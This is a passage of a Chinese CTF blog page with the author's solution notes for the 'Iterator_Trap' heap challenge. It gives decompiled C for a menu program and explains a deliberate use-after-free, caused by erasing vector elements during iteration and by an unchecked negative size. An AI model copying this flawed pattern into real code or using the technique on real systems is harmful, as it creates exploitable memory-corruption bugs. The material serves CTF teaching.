                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Error executing command '</span><span class="token interpolation"><span class="token punctuation">&#123;</span>command<span class="token punctuation">&#125;</span></span><span class="token string">': </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Only 'break', 'set', and 'continue' commands are allowed."</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            <span class="token keyword">pass</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	
	</div>
  <a type="button" href="/2024/09/02/gdbjail/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2024/08/31/nss3rd出题-Iterator-Trap解题思路/" >nss3rd出题_Iterator_Trap解题思路</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2024-08-31  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<p>题目附件<a target="_blank" rel="noopener" href="https://github.com/nyyyddddn/ctf/tree/main/nssr3d_Iterator_Trap/Iterator_Trap">https://github.com/nyyyddddn/ctf/tree/main/nssr3d_Iterator_Trap/Iterator_Trap</a></p>
<h2 id="Iterator-Trap"><a href="#Iterator-Trap" class="headerlink" title="Iterator_Trap"></a>Iterator_Trap</h2><p>这是一个关于stl迭代器不安全使用导致uaf的漏洞，第一次出和stl相关的题目</p>
<p>题目逻辑</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __fastcall __noreturn <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token class-name">uint32_t</span> choice<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-54h] BYREF</span>
  std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token operator">></span> chunklist<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-50h] BYREF</span>
  std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> sizelist<span class="token punctuation">;</span> <span class="token comment">// [rsp+30h] [rbp-30h] BYREF</span>
  <span class="token keyword">unsigned</span> __int64 v6<span class="token punctuation">;</span> <span class="token comment">// [rsp+48h] [rbp-18h]</span>

  v6 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">></span><span class="token operator">::</span><span class="token function">vector</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chunklist<span class="token punctuation">)</span><span class="token punctuation">;</span>
  std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">::</span><span class="token function">vector</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>sizelist<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">gift</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token function">menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%u"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>choice<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> choice <span class="token operator">!=</span> <span class="token number">3</span> <span class="token punctuation">)</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token function">edit_func</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chunklist<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sizelist<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> choice <span class="token operator">></span> <span class="token number">3</span> <span class="token punctuation">)</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> choice <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token function">create_func</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chunklist<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sizelist<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span>
    <span class="token punctuation">&#123;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> choice <span class="token operator">!=</span> <span class="token number">2</span> <span class="token punctuation">)</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token function">delete_func</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chunklist<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sizelist<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> __cdecl <span class="token function">menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[1] void create(__uint32_t size,char *content)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[2] void delete(__uint32_t idx)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[3] void edit(__uint32_t idx,char *content)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">">>> "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> __cdecl <span class="token function">gift</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>v0<span class="token punctuation">;</span> <span class="token comment">// rax</span>

  v0 <span class="token operator">=</span> <span class="token function">sbrk</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Welcome to nssctf 3rd. gift: %p\n"</span><span class="token punctuation">,</span> v0<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> __cdecl <span class="token function">create_func</span><span class="token punctuation">(</span>std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token operator">></span> <span class="token operator">*</span>chunklist<span class="token punctuation">,</span> std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token operator">*</span>sizelist<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">::</span>size_type v2<span class="token punctuation">;</span> <span class="token comment">// rdx</span>
  __gnu_cxx<span class="token operator">::</span>__alloc_traits<span class="token operator">&lt;</span>std<span class="token operator">::</span>allocator<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token punctuation">,</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">::</span>value_type v3<span class="token punctuation">;</span> <span class="token comment">// ebx</span>
  std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token operator">></span><span class="token operator">::</span>size_type v4<span class="token punctuation">;</span> <span class="token comment">// rdx</span>
  <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>v5<span class="token punctuation">;</span> <span class="token comment">// rax</span>
  <span class="token keyword">int</span> size<span class="token punctuation">;</span> <span class="token comment">// [rsp+1Ch] [rbp-24h] BYREF</span>
  std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token operator">></span><span class="token operator">::</span>value_type __x<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+20h] [rbp-20h] BYREF</span>

  __x<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token operator">></span><span class="token operator">::</span>value_type<span class="token punctuation">)</span><span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"size: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>
  __x<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>
  std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">></span><span class="token operator">::</span><span class="token function">push_back</span><span class="token punctuation">(</span>chunklist<span class="token punctuation">,</span> __x<span class="token punctuation">)</span><span class="token punctuation">;</span>
  std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">::</span><span class="token function">push_back</span><span class="token punctuation">(</span>sizelist<span class="token punctuation">,</span> <span class="token operator">&amp;</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"content: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v2 <span class="token operator">=</span> std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">::</span><span class="token function">size</span><span class="token punctuation">(</span>sizelist<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
  v3 <span class="token operator">=</span> <span class="token operator">*</span>std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">::</span>operator<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span>sizelist<span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">;</span>
  v4 <span class="token operator">=</span> std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">></span><span class="token operator">::</span><span class="token function">size</span><span class="token punctuation">(</span>chunklist<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
  v5 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">></span><span class="token operator">::</span>operator<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span>chunklist<span class="token punctuation">,</span> v4<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">my_fgets</span><span class="token punctuation">(</span><span class="token operator">*</span>v5<span class="token punctuation">,</span> v3<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token class-name">ssize_t</span> __cdecl <span class="token function">my_fgets</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span> <span class="token keyword">int</span> size<span class="token punctuation">,</span> <span class="token keyword">int</span> fd<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token class-name">size_t</span> v4<span class="token punctuation">;</span> <span class="token comment">// rdx</span>
  <span class="token keyword">char</span> ch_0<span class="token punctuation">;</span> <span class="token comment">// [rsp+17h] [rbp-19h] BYREF</span>
  <span class="token class-name">size_t</span> total_read<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-18h]</span>
  <span class="token class-name">ssize_t</span> bytes_read<span class="token punctuation">;</span> <span class="token comment">// [rsp+20h] [rbp-10h]</span>
  <span class="token keyword">unsigned</span> __int64 v9<span class="token punctuation">;</span> <span class="token comment">// [rsp+28h] [rbp-8h]</span>

  v9 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> size <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token operator">!</span>buf <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1LL</span><span class="token punctuation">;</span>
  total_read <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span> total_read <span class="token operator">&lt;</span> size <span class="token operator">-</span> <span class="token number">1</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    bytes_read <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>ch_0<span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> ch_0 <span class="token operator">==</span> <span class="token number">10</span> <span class="token punctuation">)</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    v4 <span class="token operator">=</span> total_read<span class="token operator">++</span><span class="token punctuation">;</span>
    buf<span class="token punctuation">[</span>v4<span class="token punctuation">]</span> <span class="token operator">=</span> ch_0<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> total_read<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> __cdecl <span class="token function">delete_func</span><span class="token punctuation">(</span>std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token operator">></span> <span class="token operator">*</span>chunklist<span class="token punctuation">,</span> std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token operator">*</span>sizelist<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token operator">></span><span class="token operator">::</span>size_type M_current_low<span class="token punctuation">;</span> <span class="token comment">// rbx</span>
  <span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span>v4<span class="token punctuation">;</span> <span class="token comment">// rax</span>
  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+1Ch] [rbp-34h]</span>
  __gnu_cxx<span class="token operator">::</span>__normal_iterator<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token punctuation">,</span>std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token operator">></span> v6<span class="token punctuation">;</span> <span class="token comment">// [rsp+20h] [rbp-30h] BYREF</span>
  __gnu_cxx<span class="token operator">::</span>__normal_iterator<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token punctuation">,</span>std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token operator">></span> __i<span class="token punctuation">;</span> <span class="token comment">// [rsp+28h] [rbp-28h] BYREF</span>
  __gnu_cxx<span class="token operator">::</span>__normal_iterator<span class="token operator">&lt;</span><span class="token keyword">void</span><span class="token operator">*</span> <span class="token keyword">const</span><span class="token operator">*</span><span class="token punctuation">,</span>std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token operator">></span> <span class="token operator">></span> idx<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+30h] [rbp-20h] BYREF</span>

  idx<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_M_current <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token keyword">const</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">::</span><span class="token function">size</span><span class="token punctuation">(</span>sizelist<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span>std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">::</span>operator<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span>sizelist<span class="token punctuation">,</span> i<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      v6<span class="token punctuation">.</span>_M_current <span class="token operator">=</span> std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">::</span><span class="token function">begin</span><span class="token punctuation">(</span>sizelist<span class="token punctuation">)</span><span class="token punctuation">.</span>_M_current<span class="token punctuation">;</span>
      __i<span class="token punctuation">.</span>_M_current <span class="token operator">=</span> __gnu_cxx<span class="token operator">::</span>__normal_iterator<span class="token operator">&lt;</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">,</span>std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span><span class="token operator">::</span>operator<span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v6<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">.</span>_M_current<span class="token punctuation">;</span>
      __gnu_cxx<span class="token operator">::</span>__normal_iterator<span class="token operator">&lt;</span><span class="token keyword">int</span> <span class="token keyword">const</span><span class="token operator">*</span><span class="token punctuation">,</span>std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span><span class="token operator">::</span>__normal_iterator<span class="token operator">&lt;</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token operator">></span><span class="token punctuation">(</span>
        <span class="token punctuation">(</span>__gnu_cxx<span class="token operator">::</span>__normal_iterator<span class="token operator">&lt;</span><span class="token keyword">int</span> <span class="token keyword">const</span><span class="token operator">*</span><span class="token punctuation">,</span>std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token operator">></span> <span class="token operator">*</span><span class="token keyword">const</span><span class="token punctuation">)</span>idx<span class="token punctuation">,</span>
        <span class="token operator">&amp;</span>__i<span class="token punctuation">)</span><span class="token punctuation">;</span>
      std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">::</span><span class="token function">erase</span><span class="token punctuation">(</span>sizelist<span class="token punctuation">,</span> <span class="token punctuation">(</span>std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">::</span>const_iterator<span class="token punctuation">)</span>idx<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_M_current<span class="token punctuation">)</span><span class="token punctuation">;</span>
      v6<span class="token punctuation">.</span>_M_current <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span>std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">></span><span class="token operator">::</span><span class="token function">begin</span><span class="token punctuation">(</span>chunklist<span class="token punctuation">)</span><span class="token punctuation">.</span>_M_current<span class="token punctuation">;</span>
      __i<span class="token punctuation">.</span>_M_current <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span>__gnu_cxx<span class="token operator">::</span>__normal_iterator<span class="token operator">&lt;</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">,</span>std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">>></span><span class="token operator">::</span>operator<span class="token operator">+</span><span class="token punctuation">(</span>
                                <span class="token punctuation">(</span><span class="token keyword">const</span> __gnu_cxx<span class="token operator">::</span>__normal_iterator<span class="token operator">&lt;</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">,</span>std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token operator">></span> <span class="token operator">></span> <span class="token operator">*</span><span class="token keyword">const</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v6<span class="token punctuation">,</span>
                                i<span class="token punctuation">)</span><span class="token punctuation">.</span>_M_current<span class="token punctuation">;</span>
      __gnu_cxx<span class="token operator">::</span>__normal_iterator<span class="token operator">&lt;</span><span class="token keyword">void</span> <span class="token operator">*</span> <span class="token keyword">const</span><span class="token operator">*</span><span class="token punctuation">,</span>std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">>></span><span class="token operator">::</span>__normal_iterator<span class="token operator">&lt;</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">></span><span class="token punctuation">(</span>
        idx<span class="token punctuation">,</span>
        <span class="token punctuation">(</span><span class="token keyword">const</span> __gnu_cxx<span class="token operator">::</span>__normal_iterator<span class="token operator">&lt;</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">,</span>std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token operator">></span> <span class="token operator">></span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>__i<span class="token punctuation">)</span><span class="token punctuation">;</span>
      std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">></span><span class="token operator">::</span><span class="token function">erase</span><span class="token punctuation">(</span>chunklist<span class="token punctuation">,</span> idx<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"idx: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> idx<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">SLODWORD</span><span class="token punctuation">(</span>idx<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_M_current<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">0</span>
    <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>M_current_low <span class="token operator">=</span> <span class="token function">SLODWORD</span><span class="token punctuation">(</span>idx<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_M_current<span class="token punctuation">)</span><span class="token punctuation">,</span> M_current_low <span class="token operator">&lt;</span> std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">></span><span class="token operator">::</span><span class="token function">size</span><span class="token punctuation">(</span>chunklist<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    v4 <span class="token operator">=</span> std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">></span><span class="token operator">::</span>operator<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span>chunklist<span class="token punctuation">,</span> <span class="token function">SLODWORD</span><span class="token punctuation">(</span>idx<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_M_current<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span><span class="token operator">*</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">*</span>std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">::</span>operator<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span>sizelist<span class="token punctuation">,</span> <span class="token function">SLODWORD</span><span class="token punctuation">(</span>idx<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_M_current<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"success"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">else</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>漏洞出在 delete_func这边 在delete前会根据sizelist容器中成员的值，判断哪些是free状态的成员然后再erase这些成员，但是在erase的时候是根据begin() + i 去erase的，erase完后容器的大小发生了变化，下一个begin() + i 就不是原先的 begin() + i了，所以在delete的时候并不能earse连续的free状态的成员，所以存在一个uaf。 然后create的时候size也没有做下界的判断，所以可以通过create_func去创建连续负值的size去构造uaf。</p>
